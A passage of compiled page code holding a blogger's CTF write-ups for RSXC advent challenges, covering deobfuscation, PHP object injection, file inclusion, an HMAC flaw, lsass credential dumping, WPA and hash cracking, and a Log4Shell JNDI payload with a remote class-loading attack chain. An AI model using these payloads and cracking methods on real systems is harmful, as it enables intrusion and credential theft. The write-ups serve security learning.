`),us=t(j3,"A",{href:!0,rel:!0,class:!0,target:!0});var S5=o(us);Hm=i(S5,"https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),S5.forEach(a),j3.forEach(a),W5.forEach(a),su=k(s),wn=t(s,"H3",{id:!0});var M5=o(wn);ro=t(M5,"A",{href:!0});var I5=o(ro);Am=i(I5,"Solution"),I5.forEach(a),M5.forEach(a),au=k(s),Rs=t(s,"P",{});var kf=o(Rs);Xm=i(kf,"Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the "),kl=t(kf,"CODE",{});var O5=o(kl);Gm=i(O5,"eval"),O5.forEach(a),qm=i(kf," commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:"),kf.forEach(a),nu=k(s),En=t(s,"PRE",{class:!0});var BT=o(En);BT.forEach(a),eu=k(s),Tn=t(s,"PRE",{class:!0});var $T=o(Tn);$T.forEach(a),tu=k(s),Ns=t(s,"P",{});var ff=o(Ns);Bm=i(ff,"Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable "),fl=t(ff,"CODE",{});var F5=o(fl);$m=i(F5,"s"),F5.forEach(a),Qm=i(ff," seemed to have changed."),ff.forEach(a),ou=k(s),yn=t(s,"PRE",{class:!0});var QT=o(yn);QT.forEach(a),pu=k(s),Ws=t(s,"P",{});var hf=o(Ws);Lm=i(hf,"Further I piped this bash output into a new file "),hl=t(hf,"CODE",{});var z5=o(hl);Km=i(z5,"16-challenge2.sh"),z5.forEach(a),s2=i(hf,", adding the neccessary edits and modifications to safely run the code:"),hf.forEach(a),lu=k(s),Vn=t(s,"PRE",{class:!0});var LT=o(Vn);LT.forEach(a),cu=k(s),uo=t(s,"P",{});var C5=o(uo);a2=i(C5,"Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:"),C5.forEach(a),iu=k(s),xn=t(s,"PRE",{class:!0});var KT=o(xn);KT.forEach(a),ru=k(s),P=t(s,"P",{});var kp=o(P);n2=i(kp,"Looking like we\u2019re nearing the final steps as there is some commands piped into "),dl=t(kp,"CODE",{});var D5=o(dl);e2=i(D5,"sh"),D5.forEach(a),t2=i(kp,", I write the output into the final bash file "),ml=t(kp,"CODE",{});var Y5=o(ml);o2=i(Y5,"16-challenge3.sh"),Y5.forEach(a),p2=i(kp," with some minor changes once again:"),kp.forEach(a),uu=k(s),Un=t(s,"PRE",{class:!0});var sy=o(Un);sy.forEach(a),ku=k(s),N=t(s,"P",{});var Zs=o(N);l2=i(Zs,"Running this bash script gave a completely different output with a quite large hexadecimal piped into "),bl=t(Zs,"CODE",{});var Z5=o(bl);c2=i(Z5,"xxd"),Z5.forEach(a),i2=i(Zs," and then "),gl=t(Zs,"CODE",{});var J5=o(gl);r2=i(J5,"sh"),J5.forEach(a),u2=i(Zs," for execution. Further running this command directly without executing ("),vl=t(Zs,"CODE",{});var j5=o(vl);k2=i(j5,"| sh"),j5.forEach(a),f2=i(Zs,") gives:"),Zs.forEach(a),fu=k(s),Rn=t(s,"PRE",{class:!0});var ay=o(Rn);ay.forEach(a),hu=k(s),ko=t(s,"P",{});var P5=o(ko);h2=i(P5,"The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:"),P5.forEach(a),du=k(s),Nn=t(s,"PRE",{class:!0});var ny=o(Nn);ny.forEach(a),mu=k(s),Wn=t(s,"P",{});var P3=o(Wn);d2=i(P3,"The flag is: "),_l=t(P3,"CODE",{});var H5=o(_l);m2=i(H5,"RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}"),H5.forEach(a),P3.forEach(a),bu=k(s),Sn=t(s,"H2",{id:!0});var A5=o(Sn);fo=t(A5,"A",{href:!0});var X5=o(fo);b2=i(X5,"[DAY 17] My XMas card"),X5.forEach(a),A5.forEach(a),gu=k(s),Mn=t(s,"H3",{id:!0});var G5=o(Mn);ho=t(G5,"A",{href:!0});var q5=o(ho);g2=i(q5,"Challenge"),q5.forEach(a),G5.forEach(a),vu=k(s),mo=t(s,"BLOCKQUOTE",{});var B5=o(mo);bo=t(B5,"P",{});var H3=o(bo);v2=i(H3,`We felt like it\u2019s time to start sending out some XMas cards, maybe you find something you like?
`),ks=t(H3,"A",{href:!0,rel:!0,class:!0,target:!0});var $5=o(ks);_2=i($5,"http://rsxc.no:20017"),$5.forEach(a),H3.forEach(a),B5.forEach(a),_u=k(s),In=t(s,"H3",{id:!0});var Q5=o(In);go=t(Q5,"A",{href:!0});var L5=o(go);w2=i(L5,"Solution"),L5.forEach(a),Q5.forEach(a),wu=k(s),m=t(s,"P",{});var w=o(m);E2=i(w,"Navigating to the page we are greeted with a Xmas card along with the lines of \u201CFinding your card in /files\u201D. This hint tells us that there exists a directory/path to "),wl=t(w,"CODE",{});var K5=o(wl);T2=i(K5,"/files"),K5.forEach(a),y2=i(w,". Going to that said directory, we can see that there are 3 files: "),El=t(w,"CODE",{});var sw=o(El);V2=i(sw,"card.txt"),sw.forEach(a),x2=i(w,", "),Tl=t(w,"CODE",{});var aw=o(Tl);U2=i(aw,"index.php-1"),aw.forEach(a),R2=i(w," and "),yl=t(w,"CODE",{});var nw=o(yl);N2=i(nw,"flag.txt"),nw.forEach(a),W2=i(w,". Guessing that the flag is in the "),Vl=t(w,"CODE",{});var ew=o(Vl);S2=i(ew,"flag.txt"),ew.forEach(a),M2=i(w," file, I get a forbidden error on opening it as I don\u2019t have permission to access the resource. Looking at all the other files we see that the content of "),xl=t(w,"CODE",{});var tw=o(xl);I2=i(tw,"card.txt"),tw.forEach(a),O2=i(w," is loaded and read at "),Ul=t(w,"CODE",{});var ow=o(Ul);F2=i(ow,"index.php"),ow.forEach(a),z2=i(w,", and the source code could be seen in "),Rl=t(w,"CODE",{});var pw=o(Rl);C2=i(pw,"index.php-1"),pw.forEach(a),D2=i(w,":"),w.forEach(a),Eu=k(s),On=t(s,"PRE",{class:!0});var ey=o(On);ey.forEach(a),Tu=k(s),W=t(s,"P",{});var Js=o(W);Y2=i(Js,"Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized "),Nl=t(Js,"CODE",{});var lw=o(Nl);Z2=i(lw,"Card"),lw.forEach(a),J2=i(Js," object to the GET request input, the object is constructed and the method "),Wl=t(Js,"CODE",{});var cw=o(Wl);j2=i(cw,"displayCard()"),cw.forEach(a),P2=i(Js," is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of "),Sl=t(Js,"CODE",{});var iw=o(Sl);H2=i(iw,"Card"),iw.forEach(a),A2=i(Js," and then serializing it:"),Js.forEach(a),yu=k(s),Fn=t(s,"PRE",{class:!0});var ty=o(Fn);ty.forEach(a),Vu=k(s),zn=t(s,"PRE",{class:!0});var oy=o(zn);oy.forEach(a),xu=k(s),Cn=t(s,"P",{});var A3=o(Cn);X2=i(A3,"The flag is: "),Ml=t(A3,"CODE",{});var rw=o(Ml);G2=i(rw,"RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}"),rw.forEach(a),A3.forEach(a),Uu=k(s),Dn=t(s,"H2",{id:!0});var uw=o(Dn);vo=t(uw,"A",{href:!0});var kw=o(vo);q2=i(kw,"[DAY 18] Remember the flag? Docker remembers"),kw.forEach(a),uw.forEach(a),Ru=k(s),Yn=t(s,"H3",{id:!0});var fw=o(Yn);_o=t(fw,"A",{href:!0});var hw=o(_o);B2=i(hw,"Challenge"),hw.forEach(a),fw.forEach(a),Nu=k(s),wo=t(s,"BLOCKQUOTE",{});var dw=o(wo);Eo=t(dw,"P",{});var X3=o(Eo);$2=i(X3,`We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
`),fs=t(X3,"A",{href:!0,rel:!0,class:!0,target:!0});var mw=o(fs);Q2=i(mw,"https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),mw.forEach(a),X3.forEach(a),dw.forEach(a),Wu=k(s),Zn=t(s,"H3",{id:!0});var bw=o(Zn);To=t(bw,"A",{href:!0});var gw=o(To);L2=i(gw,"Solution"),gw.forEach(a),bw.forEach(a),Su=k(s),Ss=t(s,"P",{});var df=o(Ss);K2=i(df,"We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running "),Il=t(df,"CODE",{});var vw=o(Il);s1=i(vw,"strings"),vw.forEach(a),a1=i(df," and greping for the flag on the uncompressed file gives us the flag in plaintext\u2026 Sometimes, solving a challenge can be as easy as just that."),df.forEach(a),Mu=k(s),Jn=t(s,"PRE",{class:!0});var py=o(Jn);py.forEach(a),Iu=k(s),jn=t(s,"P",{});var G3=o(jn);n1=i(G3,"The flag is: "),Ol=t(G3,"CODE",{});var _w=o(Ol);e1=i(_w,"RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}"),_w.forEach(a),G3.forEach(a),Ou=k(s),Pn=t(s,"H2",{id:!0});var ww=o(Pn);yo=t(ww,"A",{href:!0});var Ew=o(yo);t1=i(Ew,"[DAY 19] The inclusive xmas cards"),Ew.forEach(a),ww.forEach(a),Fu=k(s),Hn=t(s,"H3",{id:!0});var Tw=o(Hn);Vo=t(Tw,"A",{href:!0});var yw=o(Vo);o1=i(yw,"Challenge"),yw.forEach(a),Tw.forEach(a),zu=k(s),xo=t(s,"BLOCKQUOTE",{});var Vw=o(xo);Uo=t(Vw,"P",{});var q3=o(Uo);p1=i(q3,`We felt that the our last xmas cards weren\u2019t that inclusive. So we made even more options, so everyone has one that fits them!
`),hs=t(q3,"A",{href:!0,rel:!0,class:!0,target:!0});var xw=o(hs);l1=i(xw,"http://rsxc.no:20019"),xw.forEach(a),q3.forEach(a),Vw.forEach(a),Cu=k(s),An=t(s,"H3",{id:!0});var Uw=o(An);Ro=t(Uw,"A",{href:!0});var Rw=o(Ro);c1=i(Rw,"Solution"),Rw.forEach(a),Uw.forEach(a),Du=k(s),g=t(s,"P",{});var x=o(g);i1=i(x,"Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory "),Fl=t(x,"CODE",{});var Nw=o(Fl);r1=i(Nw,"/files"),Nw.forEach(a),u1=i(x,". The only text files we could see was "),zl=t(x,"CODE",{});var Ww=o(zl);k1=i(Ww,"flag.txt"),Ww.forEach(a),f1=i(x,", "),Cl=t(x,"CODE",{});var Sw=o(Cl);h1=i(Sw,"santa.txt"),Sw.forEach(a),d1=i(x,", "),Dl=t(x,"CODE",{});var Mw=o(Dl);m1=i(Mw,"snowmen.txt"),Mw.forEach(a),b1=i(x," and "),Yl=t(x,"CODE",{});var Iw=o(Yl);g1=i(Iw,"tree.txt"),Iw.forEach(a),v1=i(x,". Again, we don\u2019t have permission to open "),Zl=t(x,"CODE",{});var Ow=o(Zl);_1=i(Ow,"flag.txt"),Ow.forEach(a),w1=i(x," just as last time."),x.forEach(a),Yu=k(s),E=t(s,"P",{});var S=o(E);E1=i(S,"Testing the application and opening the "),Jl=t(S,"CODE",{});var Fw=o(Jl);T1=i(Fw,"xmas tree"),Fw.forEach(a),y1=i(S," card for instance, we see that we are directed to the url: "),jl=t(S,"CODE",{});var zw=o(jl);V1=i(zw,"http://rsxc.no:20019/card.php?card=dHJlZS50eHQ="),zw.forEach(a),x1=i(S,", the same php file "),Pl=t(S,"CODE",{});var Cw=o(Pl);U1=i(Cw,"card.php"),Cw.forEach(a),R1=i(S," as last time with the GET request of "),Hl=t(S,"CODE",{});var Dw=o(Hl);N1=i(Dw,"?card=dHJlZS50eHQ="),Dw.forEach(a),W1=i(S,". This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64\u2019ing the desired file input at the directory "),Al=t(S,"CODE",{});var Yw=o(Al);S1=i(Yw,"/files"),Yw.forEach(a),M1=i(S,"."),S.forEach(a),Zu=k(s),Xn=t(s,"PRE",{class:!0});var ly=o(Xn);ly.forEach(a),Ju=k(s),H=t(s,"P",{});var fp=o(H);I1=i(fp,"Since we can control the GET request input of "),Xl=t(fp,"CODE",{});var Zw=o(Xl);O1=i(Zw,"card"),Zw.forEach(a),F1=i(fp,", reading the flag is as easy as requesting for the file "),Gl=t(fp,"CODE",{});var Jw=o(Gl);z1=i(Jw,"flag.txt"),Jw.forEach(a),C1=i(fp," encoded in base64:"),fp.forEach(a),ju=k(s),Gn=t(s,"PRE",{class:!0});var cy=o(Gn);cy.forEach(a),Pu=k(s),qn=t(s,"P",{});var B3=o(qn);D1=i(B3,"The flag is: "),ql=t(B3,"CODE",{});var jw=o(ql);Y1=i(jw,"RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}"),jw.forEach(a),B3.forEach(a),Hu=k(s),Bn=t(s,"H2",{id:!0});var Pw=o(Bn);No=t(Pw,"A",{href:!0});var Hw=o(No);Z1=i(Hw,"[DAY 20] Easy mistakes"),Hw.forEach(a),Pw.forEach(a),Au=k(s),$n=t(s,"H3",{id:!0});var Aw=o($n);Wo=t(Aw,"A",{href:!0});var Xw=o(Wo);J1=i(Xw,"Challenge"),Xw.forEach(a),Aw.forEach(a),Xu=k(s),So=t(s,"BLOCKQUOTE",{});var Gw=o(So);Mo=t(Gw,"P",{});var $3=o(Mo);j1=i($3,`When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
`),ds=t($3,"A",{href:!0,rel:!0,class:!0,target:!0});var qw=o(ds);P1=i(qw,"http://rsxc.no:20020"),qw.forEach(a),$3.forEach(a),Gw.forEach(a),Gu=k(s),Qn=t(s,"H3",{id:!0});var Bw=o(Qn);Io=t(Bw,"A",{href:!0});var $w=o(Io);H1=i($w,"Solution"),$w.forEach(a),Bw.forEach(a),qu=k(s),Oo=t(s,"P",{});var Qw=o(Oo);A1=i(Qw,"Upon navigating to the site we are greeted with the source code of the challenge:"),Qw.forEach(a),Bu=k(s),Ln=t(s,"PRE",{class:!0});var iy=o(Ln);iy.forEach(a),$u=k(s),T=t(s,"P",{});var M=o(T);X1=i(M,"Looking at the code we can see that the api path takes in two inputs as JSON body requests, "),Bl=t(M,"CODE",{});var Lw=o(Bl);G1=i(Lw,"hmac"),Lw.forEach(a),q1=i(M," and "),$l=t(M,"CODE",{});var Kw=o($l);B1=i(Kw,"host"),Kw.forEach(a),$1=i(M,". Upon receiving the correct body input, it signs the "),Ql=t(M,"CODE",{});var sE=o(Ql);Q1=i(sE,"host"),sE.forEach(a),L1=i(M," input with a secret using the hashing algorithm "),Ll=t(M,"CODE",{});var aE=o(Ll);K1=i(aE,"sha256"),aE.forEach(a),sb=i(M," and comparing the result with the "),Kl=t(M,"CODE",{});var nE=o(Kl);ab=i(nE,"hmac"),nE.forEach(a),nb=i(M," input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:"),M.forEach(a),Qu=k(s),Kn=t(s,"PRE",{class:!0});var ry=o(Kn);ry.forEach(a),Lu=k(s),se=t(s,"P",{});var Q3=o(se);eb=i(Q3,"The flag is: "),sc=t(Q3,"CODE",{});var eE=o(sc);tb=i(eE,"RSXC{You_have_to_have_the_right_order_for_arguments!}"),eE.forEach(a),Q3.forEach(a),Ku=k(s),ae=t(s,"H2",{id:!0});var tE=o(ae);Fo=t(tE,"A",{href:!0});var oE=o(Fo);ob=i(oE,"[DAY 21] Nice memories"),oE.forEach(a),tE.forEach(a),sk=k(s),ne=t(s,"H3",{id:!0});var pE=o(ne);zo=t(pE,"A",{href:!0});var lE=o(zo);pb=i(lE,"Challenge"),lE.forEach(a),pE.forEach(a),ak=k(s),Co=t(s,"BLOCKQUOTE",{});var cE=o(Co);Do=t(cE,"P",{});var L3=o(Do);lb=i(L3,`Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
`),ms=t(L3,"A",{href:!0,rel:!0,class:!0,target:!0});var iE=o(ms);cb=i(iE,"https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),iE.forEach(a),L3.forEach(a),cE.forEach(a),nk=k(s),ee=t(s,"H3",{id:!0});var rE=o(ee);Yo=t(rE,"A",{href:!0});var uE=o(Yo);ib=i(uE,"Solution"),uE.forEach(a),rE.forEach(a),ek=k(s),A=t(s,"P",{});var hp=o(A);rb=i(hp,"We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file "),ac=t(hp,"CODE",{});var kE=o(ac);ub=i(kE,"lsass.DMP"),kE.forEach(a),kb=i(hp," instead of my usual linux setup "),nc=t(hp,"EM",{});var fE=o(nc);fb=i(fE,"(this is due to not having an instance of kali linux ready)"),fE.forEach(a),hb=i(hp,"."),hp.forEach(a),tk=k(s),te=t(s,"PRE",{class:!0});var uy=o(te);uy.forEach(a),ok=k(s),y=t(s,"P",{});var I=o(y);db=i(I,"After getting the NTLM hash ("),ec=t(I,"CODE",{});var hE=o(ec);mb=i(hE,"7801ee9c5762bb027ee224d54cb8f62e"),hE.forEach(a),bb=i(I,") of the password for the user "),tc=t(I,"CODE",{});var dE=o(tc);gb=i(dE,"river-security-xmas"),dE.forEach(a),vb=i(I," through mimikatz. With the hint of "),oc=t(I,"CODE",{});var mE=o(oc);_b=i(mE,"Can you rock our world and find the flag for us?"),mE.forEach(a),wb=i(I,", hinting to the use of "),pc=t(I,"CODE",{});var bE=o(pc);Eb=i(bE,"rockyou.txt"),bE.forEach(a),Tb=i(I,", I bruteforced the password of this hash using "),lc=t(I,"CODE",{});var gE=o(lc);yb=i(gE,"john-the-ripper"),gE.forEach(a),Vb=i(I," (a password cracking tool running on the CPU):"),I.forEach(a),pk=k(s),oe=t(s,"PRE",{class:!0});var ky=o(oe);ky.forEach(a),lk=k(s),pe=t(s,"P",{});var K3=o(pe);xb=i(K3,"The flag is: "),cc=t(K3,"CODE",{});var vE=o(cc);Ub=i(vE,"alliwantforchristmasisyou"),vE.forEach(a),K3.forEach(a),ck=k(s),le=t(s,"H2",{id:!0});var _E=o(le);Zo=t(_E,"A",{href:!0});var wE=o(Zo);Rb=i(wE,"[DAY 22] Wireless communication"),wE.forEach(a),_E.forEach(a),ik=k(s),ce=t(s,"H3",{id:!0});var EE=o(ce);Jo=t(EE,"A",{href:!0});var TE=o(Jo);Nb=i(TE,"Challenge"),TE.forEach(a),EE.forEach(a),rk=k(s),jo=t(s,"BLOCKQUOTE",{});var yE=o(jo);ic=t(yE,"P",{});var VE=o(ic);Wb=i(VE,`We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap`),VE.forEach(a),yE.forEach(a),uk=k(s),ie=t(s,"H3",{id:!0});var xE=o(ie);Po=t(xE,"A",{href:!0});var UE=o(Po);Sb=i(UE,"Solution"),UE.forEach(a),xE.forEach(a),kk=k(s),v=t(s,"P",{});var U=o(v);Mb=i(U,"We are given a pcap file containing some WPA network sniffed packet. Along with the hint of "),rc=t(U,"CODE",{});var RE=o(rc);Ib=i(RE,'"Can you Rock our world?"'),RE.forEach(a),Ob=i(U,", hinting to the usage of "),uc=t(U,"CODE",{});var NE=o(uc);Fb=i(NE,"rockyou.txt"),NE.forEach(a),zb=i(U,". I guessed we could recover or bruteforce the password starting with an "),kc=t(U,"CODE",{});var WE=o(kc);Cb=i(WE,"S"),WE.forEach(a),Db=i(U," for this network for us to read the encrypted data. Since I didn\u2019t have any computer with GPU on hand, bruteforcing with a tool running with CPU such as "),fc=t(U,"CODE",{});var SE=o(fc);Yb=i(SE,"john-the-ripper"),SE.forEach(a),Zb=i(U," or "),hc=t(U,"CODE",{});var ME=o(hc);Jb=i(ME,"aircrack-nk"),ME.forEach(a),jb=i(U," was the only choice. I chose to go with the latter, "),dc=t(U,"CODE",{});var IE=o(dc);Pb=i(IE,"aircrack-ng"),IE.forEach(a),Hb=i(U," (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job."),U.forEach(a),fk=k(s),Ms=t(s,"P",{});var mf=o(Ms);Ab=i(mf,"In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase "),mc=t(mf,"CODE",{});var OE=o(mc);Xb=i(OE,"S"),OE.forEach(a),Gb=i(mf," through a quick python script:"),mf.forEach(a),hk=k(s),re=t(s,"PRE",{class:!0});var fy=o(re);fy.forEach(a),dk=k(s),Ho=t(s,"P",{});var FE=o(Ho);qb=i(FE,"After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:"),FE.forEach(a),mk=k(s),ue=t(s,"PRE",{class:!0});var hy=o(ue);hy.forEach(a),bk=k(s),Is=t(s,"P",{});var bf=o(Is);Bb=i(bf,"The password we retrieved is: "),bc=t(bf,"CODE",{});var zE=o(bc);$b=i(zE,"Santaclaws99"),zE.forEach(a),Qb=i(bf,"."),bf.forEach(a),gk=k(s),Os=t(s,"DIV",{class:!0});var sg=o(Os);Ao=t(sg,"FIGURE",{class:!0});var CE=o(Ao);gc=t(CE,"IMG",{src:!0}),CE.forEach(a),Xo=t(sg,"FIGURE",{class:!0});var DE=o(Xo);vc=t(DE,"IMG",{src:!0}),DE.forEach(a),sg.forEach(a),vk=k(s),ke=t(s,"FIGURE",{class:!0});var YE=o(ke);_c=t(YE,"IMG",{src:!0}),YE.forEach(a),_k=k(s),fe=t(s,"P",{});var ag=o(fe);Lb=i(ag,"The flag is: "),wc=t(ag,"CODE",{});var ZE=o(wc);Kb=i(ZE,"RSXC{WIFI_is_fun}"),ZE.forEach(a),ag.forEach(a),wk=k(s),he=t(s,"H2",{id:!0});var JE=o(he);Go=t(JE,"A",{href:!0});var jE=o(Go);s0=i(jE,"[DAY 23] Locating the location"),jE.forEach(a),JE.forEach(a),Ek=k(s),de=t(s,"H3",{id:!0});var PE=o(de);qo=t(PE,"A",{href:!0});var HE=o(qo);a0=i(HE,"Challenge"),HE.forEach(a),PE.forEach(a),Tk=k(s),Bo=t(s,"BLOCKQUOTE",{});var AE=o(Bo);$o=t(AE,"P",{});var ng=o($o);n0=i(ng,`We seem to have lost a file, can you please help us find it?
`),bs=t(ng,"A",{href:!0,rel:!0,class:!0,target:!0});var XE=o(bs);e0=i(XE,"http://rsxc.no:20023"),XE.forEach(a),ng.forEach(a),AE.forEach(a),yk=k(s),me=t(s,"H3",{id:!0});var GE=o(me);Qo=t(GE,"A",{href:!0});var qE=o(Qo);t0=i(qE,"Solution"),qE.forEach(a),GE.forEach(a),Vk=k(s),X=t(s,"P",{});var dp=o(X);o0=i(dp,"Upon navigating to the site, we are greeted with a text saying that a "),Ec=t(dp,"CODE",{});var BE=o(Ec);p0=i(BE,"flag.txt"),BE.forEach(a),l0=i(dp," file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb\u2019s "),Tc=t(dp,"CODE",{});var $E=o(Tc);c0=i($E,"small.txt"),$E.forEach(a),i0=i(dp," wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for."),dp.forEach(a),xk=k(s),G=t(s,"P",{});var mp=o(G);r0=i(mp,"From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn\u2019t run the wordlist as it is, but have to somehow manipulate it by directly searching for the file "),yc=t(mp,"CODE",{});var QE=o(yc);u0=i(QE,"flag.txt"),QE.forEach(a),k0=i(mp,". This was done by modifying the wordlist a little by appending the path "),Vc=t(mp,"CODE",{});var LE=o(Vc);f0=i(LE,"/flag.txt"),LE.forEach(a),h0=i(mp," to every line in the wordlist. A quick python script for this can be seen here:"),mp.forEach(a),Uk=k(s),be=t(s,"PRE",{class:!0});var dy=o(be);dy.forEach(a),Rk=k(s),Fs=t(s,"P",{});var gf=o(Fs);d0=i(gf,"Running "),xc=t(gf,"CODE",{});var KE=o(xc);m0=i(KE,"gobuster"),KE.forEach(a),b0=i(gf,", a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:"),gf.forEach(a),Nk=k(s),ge=t(s,"PRE",{class:!0});var my=o(ge);my.forEach(a),Wk=k(s),ve=t(s,"P",{});var eg=o(ve);g0=i(eg,"The flag is: "),Uc=t(eg,"CODE",{});var s6=o(Uc);v0=i(s6,"RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}"),s6.forEach(a),eg.forEach(a),Sk=k(s),_e=t(s,"H2",{id:!0});var a6=o(_e);Lo=t(a6,"A",{href:!0});var n6=o(Lo);_0=i(n6,"[DAY 24] The watcher"),n6.forEach(a),a6.forEach(a),Mk=k(s),we=t(s,"H3",{id:!0});var e6=o(we);Ko=t(e6,"A",{href:!0});var t6=o(Ko);w0=i(t6,"Challenge"),t6.forEach(a),e6.forEach(a),Ik=k(s),sp=t(s,"BLOCKQUOTE",{});var o6=o(sp);ap=t(o6,"P",{});var tg=o(ap);E0=i(tg,`We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
`),gs=t(tg,"A",{href:!0,rel:!0,class:!0,target:!0});var p6=o(gs);T0=i(p6,"http://rsxc.no:20024"),p6.forEach(a),tg.forEach(a),o6.forEach(a),Ok=k(s),Ee=t(s,"H3",{id:!0});var l6=o(Ee);np=t(l6,"A",{href:!0});var c6=o(np);y0=i(c6,"Solution"),c6.forEach(a),l6.forEach(a),Fk=k(s),_=t(s,"P",{});var R=o(_);V0=i(R,"Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell ("),Rc=t(R,"CODE",{});var i6=o(Rc);x0=i(i6,"CVE-2021-44228"),i6.forEach(a),U0=i(R,") affecting the Java logging package "),Nc=t(R,"CODE",{});var r6=o(Nc);R0=i(r6,"log4j"),r6.forEach(a),N0=i(R,". To confirm this, navigating to the site, we are greeted with the sentence of "),Wc=t(R,"CODE",{});var u6=o(Wc);W0=i(u6,"Be careful, I'm logging everything..."),u6.forEach(a),S0=i(R," hinting to some form of "),Sc=t(R,"CODE",{});var k6=o(Sc);M0=i(k6,"logging"),k6.forEach(a),I0=i(R,". Fuzzing for some directories such as "),Mc=t(R,"CODE",{});var f6=o(Mc);O0=i(f6,"http://rsxc.no:20024/test"),f6.forEach(a),F0=i(R," for instance, results in a "),Ic=t(R,"CODE",{});var h6=o(Ic);z0=i(h6,"Whitelabel Error Page"),h6.forEach(a),C0=i(R," due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:"),R.forEach(a),zk=k(s),ep=t(s,"BLOCKQUOTE",{});var d6=o(ep);Oc=t(d6,"P",{});var m6=o(Oc);D0=i(m6,"WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present."),m6.forEach(a),d6.forEach(a),Ck=k(s),zs=t(s,"P",{});var vf=o(zs);Y0=i(vf,"Using the site "),vs=t(vf,"A",{href:!0,rel:!0,class:!0,target:!0});var b6=o(vs);Z0=i(b6,"https://log4j-tester.trendmicro.com/"),b6.forEach(a),J0=i(vf," I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as \u201Ceverything is being logged\u201D. For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl\u2019ing the site with the JNDI payload results in a connection:"),vf.forEach(a),Dk=k(s),Te=t(s,"PRE",{class:!0});var by=o(Te);by.forEach(a),Yk=k(s),ye=t(s,"PRE",{class:!0});var gy=o(ye);gy.forEach(a),Zk=k(s),tp=t(s,"P",{});var g6=o(tp);j0=i(g6,"The site is indeed confirmed to be vulnerable to Log4Shell!"),g6.forEach(a),Jk=k(s),op=t(s,"P",{});var v6=o(op);P0=i(v6,"To exploiting the server, I setup my attack chain like so:"),v6.forEach(a),jk=k(s),z=t(s,"OL",{class:!0});var bp=o(z);Ve=t(bp,"LI",{});var _f=o(Ve);H0=i(_f,"Begin with a payload of "),Fc=t(_f,"CODE",{});var _6=o(Fc);A0=i(_6,"${jndi:ldap://localhost:1389/Exploit}"),_6.forEach(a),X0=i(_f," that reaches our LDAP Referral Server"),_f.forEach(a),G0=k(bp),zc=t(bp,"LI",{});var w6=o(zc);q0=i(w6,"Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class"),w6.forEach(a),B0=k(bp),Cc=t(bp,"LI",{});var E6=o(Cc);$0=i(E6,"The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in"),E6.forEach(a),bp.forEach(a),Pk=k(s),q=t(s,"P",{});var gp=o(q);Q0=i(gp,"Utilizing both the tool localtunnel ("),Dc=t(gp,"CODE",{});var T6=o(Dc);L0=i(T6,"lt -port 8000"),T6.forEach(a),K0=i(gp,") and ngrok ("),Yc=t(gp,"CODE",{});var y6=o(Yc);s3=i(y6,"ngrok tcp 1389"),y6.forEach(a),a3=i(gp,"), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:"),gp.forEach(a),Hk=k(s),xe=t(s,"PRE",{class:!0});var vy=o(xe);vy.forEach(a),Ak=k(s),Cs=t(s,"P",{});var wf=o(Cs);n3=i(wf,"First, with the "),_s=t(wf,"A",{href:!0,rel:!0,class:!0,target:!0});var 